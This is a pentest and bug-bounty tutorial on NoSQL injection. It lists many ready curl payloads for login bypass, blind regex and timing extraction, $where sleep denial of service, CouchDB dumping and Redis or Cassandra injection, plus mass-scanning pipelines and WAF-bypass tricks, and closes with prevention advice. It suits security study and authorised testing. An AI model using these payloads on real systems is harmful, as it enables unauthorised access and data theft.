# NoSQL Injection

> Practical, up‑to‑date guide for hunting **NoSQL Injection** (operator injection, syntax injection) during web pentests, bug bounty hunting, and security assessments.  
> Draws from OWASP NoSQL Security Cheat Sheet (updated 2025), PortSwigger Web Security Academy NoSQL Injection labs, PayloadsAllTheThings/NoSQL Injection, HackTricks (2025 defensive updates), Intigriti advanced exploitation guide (2025), and 2025–2026 trends (MongoDB $where deprecation, GraphQL filter abuse, Redis Lua injection, stricter sanitization bypasses).

NoSQL injection occurs when untrusted input is unsafely incorporated into NoSQL database queries (MongoDB, CouchDB, Cassandra, Redis, etc.), allowing attackers to bypass auth, extract data, modify records, or cause DoS — often easier than SQLi due to flexible object‑based queries.

## Methodology (Based on OWASP & PortSwigger)

**1. Identify NoSQL backends & input locations**  
- **Backends:** MongoDB (most common), CouchDB, Redis, Cassandra, Firebase Firestore, DynamoDB  
- **Input locations:** JSON/GraphQL/REST APIs (login, search, filters), user profile updates, any endpoint accepting object‑like input (`application/json`)  
- **Parameter patterns:** `username`, `email`, `password`, `query`, `filter`, `search`, `id`, `key`, `value`, `data`, `params`, `input`, `body`, `content`, `payload`

**2. Basic probes & detection (MongoDB focus)**  
- Send JSON payloads with operator injection (`$ne`, `$gt`, `$regex`, `$or`, `$and`, `$exists`, `$in`)  
- Test auth bypass (login with invalid creds), data extraction (regex wildcards), boolean always‑true conditions  
- Observe response changes, successful login, time delays, error messages

**3. Exploitation goals**  
- Authentication bypass → login as admin/any user  
- Data extraction (blind) → regex char‑by‑char, timing attacks  
- Modification → change password, add admin privileges  
- DoS → heavy `$regex`, `$where` sleep  
- Dump → enumerate fields/values via `$regex`

**4. Advanced bypasses & 2025‑2026 trends**  
- `$where` JavaScript (deprecated in MongoDB 7.0+ but still seen)  
- Aggregation / `$expr` bypasses (modern MongoDB)  
- Operator confusion / type mismatch  
- GraphQL/Apollo‑specific filter abuse  
- CouchDB, Redis Lua injection, Cassandra CQL injection  
- WAF/sanitization bypasses (Unicode/case variation, nested objects, double JSON encoding)

## Tool Installation & Setup

```bash
# nosqli – dedicated scanner & exploiter (Charlie‑belmer/nosqli)
git clone https://github.com/Charlie-belmer/nosqli.git
cd nosqli && npm install

# Burp Suite – Repeater for manual testing, Intruder for fuzzing operators
# Install NoSQLi Burp extension if available

# Nuclei – NoSQL injection templates
nuclei -t ~/nuclei-templates/nosql-injection/ -list targets.txt

# Python requests for custom automation
pip3 install requests
```

## Detection & Enumeration Commands

```bash
# 1. Mass‑scan existing endpoints for NoSQLi (using gf‑sqli.txt pattern)
cat gf-sqli.txt | qsreplace '{"$gt":""}' | httpx -silent -mc 200 | anew nosqli.txt
cat gf-sqli.txt | qsreplace "admin'||'1'=='1" | httpx -silent | anew nosqli.txt

# 2. Fuzz JSON parameters for operator injection (manual)
curl -X POST "http://target.com/api/search" -H "Content-Type: application/json" -d '{"query": {"$ne": null}}'
curl -X POST "http://target.com/api/search" -H "Content-Type: application/json" -d '{"query": {"$regex": ".*"}}'

# 3. Identify NoSQL backend via error messages
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$invalid": "test"}}'  # may leak "unknown operator $invalid"

# 4. Use nosqli scanner
nosqli scan https://target.com/login -method POST -data '{"username":"FUZZ","password":"FUZZ"}'
```

## Exploitation Commands by Vulnerability

### Authentication Bypass (Login)
```bash
# Classic $ne / $gt tricks
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# $in operator
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$in": ["admin", ""]}, "password": {"$in": ["", null]}}'

# Boolean always‑true ($or, $exists)
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"$or": [{"username": "admin"}, {"password": "anything"}]}'
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": "admin", "password": {"$exists": true}}'

# Regex wildcard (dump/enum)
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$regex": "^a"}, "password": {"$regex": ".*"}}'

# Empty array / negation tricks
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": {"$ne": -1}, "password": {"$ne": -1}}'
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"$and": [{"username": "admin"}, {"password": ""}]}'
```

### Data Extraction (Blind)
```bash
# Regex‑based character exfiltration (manual)
# Iterate over characters: {"username": {"$regex": "^a"}}, {"$regex": "^b"}, ...
for char in {a..z} {0..9}; do
  curl -s -X POST "http://target.com/login" -H "Content-Type: application/json" -d "{\"username\": {\"\$regex\": \"^$char\"}}" | grep -q "success" && echo "Found starting char: $char"
done

# Timing‑based blind ($where sleep)
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"username": "admin", "password": {"$gt": ""}, "$where": "sleep(5000)"}'
# Measure response time; if >5 seconds, injection works

# $expr aggregation (modern MongoDB)
curl -X POST "http://target.com/query" -H "Content-Type: application/json" -d '{"$expr": {"$eq": ["$username", "admin"]}}'
curl -X POST "http://target.com/query" -H "Content-Type: application/json" -d '{"$expr": {"$gt": [{"$toDouble": "$balance"}, 0]}}'
```

### Other NoSQL Databases
```bash
# CouchDB – dump all docs
curl -s "http://target.com:5984/_all_docs?startkey=[\"\"]&endkey=[\"zzzz\"]"

# Redis – Lua script injection (if EVAL allowed)
curl -X POST "http://target.com/execute" -d '{"script": "return redis.call(\"info\")"}'

# Cassandra – CQL injection (rare)
curl -X POST "http://target.com/query" -d '{"query": "SELECT * FROM users WHERE user = '\''admin'\'' AND password = '\'''\'' OR '\''1'\'' = '\''1'\''"}'
```

## Advanced Techniques & Bypasses (2025‑2026 Trends)

**1. $where JavaScript** – Deprecated in MongoDB 7.0+ but still seen in legacy deployments:
```bash
curl -X POST "http://target.com/login" -H "Content-Type: application/json" -d '{"$where": "this.username == '\''admin'\'' || true"}'
```

**2. Aggregation / $expr bypasses** – Modern MongoDB pipelines allow complex injections:
```json
{"$expr": {"$function": {"body": "function(name) { return name === 'admin'; }", "args": ["$username"], "lang": "js"}}}
```

**3. Operator confusion / type mismatch** – Exploit loose typing:
```json
{"username": ["admin"], "password": null}
{"username": {"$type": "string"}}
```

**4. GraphQL / Apollo‑specific filter abuse** – Inject into filter arguments:
```graphql
query { users(filter: {username: {_eq: "admin"}, password: {_neq: null}}) { id } }
```

**5. WAF / sanitization bypasses** – Evade simple blocklists:
- Unicode/case variation: `$Ne`, `$rEgEx`
- Nested objects: `{"$or": [{}, {"foo": "bar"}]}`
- Double JSON encoding: `%7B%22%24ne%22%3Anull%7D`
- Null bytes, line breaks, extra whitespace

**6. Second‑order NoSQLi** – Stored input later used in queries (profile updates, comments).

**7. Chained with business logic / IDOR** – Combine injection with improper access controls.

## Prevention Guidance (Developer‑Focused)

1. **Use safe query builders / ORMs** – Mongoose `sanitizeFilter: true`, `express‑mongo‑sanitize` middleware.
2. **Strip $ keys from user input** – Remove or escape MongoDB operators.
3. **Disable $where / server‑side JavaScript** – MongoDB `--noscripting` (default in v7+).
4. **Validate types strictly** – No arrays where scalars expected.
5. **Allow‑list operators / fields** – Restrict query language to known safe operators.
6. **Prefer aggregation pipelines** over dynamic objects when possible.
7. **Input validation + schema enforcement** – Joi, Ajv, JSON Schema.
8. **Least privilege** – Run NoSQL service with minimal permissions, network isolation.

## References

- [PortSwigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [OWASP NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html)
- [PayloadsAllTheThings – NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- HackTricks NoSQL Injection (2025 updates), Intigriti 2025 guide, recent write‑ups (PortSwigger labs, MongoDB 7+ changes)
- **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/NoSQL‑Injection.md](../Web‑Vulnerability‑Testing‑Checklist/NoSQL‑Injection.md)
